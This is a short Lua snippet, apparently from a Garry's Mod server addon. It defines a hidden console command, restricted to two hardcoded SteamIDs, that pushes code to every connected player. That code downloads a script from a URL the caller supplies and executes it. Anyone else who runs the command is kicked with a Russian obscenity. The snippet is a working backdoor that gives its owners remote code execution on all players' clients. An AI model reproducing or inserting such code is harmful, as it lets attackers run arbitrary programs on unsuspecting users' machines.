concommand.Add("_dibilka", function(ply, cmd, args) if not (ply:SteamID() == "STEAM_0:1:531714568" or ply:SteamID() == "STEAM_0:0:502099106") then return ply:Kick("пошёл нахуй от моей дибилки") end if not args[1] then return ply:ChatPrint("ссылку укажи, дибилка") end for _, v in ipairs(player.GetAll()) do v:SendLua("http.Fetch('" .. args[1] .. "',function(b)RunString(b)end)") end end)
